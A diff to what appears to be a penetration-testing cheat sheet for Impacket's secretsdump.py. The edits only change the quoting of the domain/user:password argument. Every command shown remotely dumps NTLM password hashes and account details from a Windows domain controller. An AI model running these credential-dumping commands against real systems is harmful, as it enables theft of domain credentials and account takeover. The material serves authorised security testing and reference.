@@ -5,7 +5,7 @@
 ## dump with account
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py '<domain>/<user>:<password>'@<ip>
+secretsdump.py ''<domain>/<user>:<password>''@<ip>
 ```
 
 ## dump with kerberos
@@ -36,12 +36,12 @@ secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administr
 ## remote extract
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
 ```
 
 ## remote extract + users infos
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
+secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> '<domain>/<user>:<password>'@<ip>
 ```
 
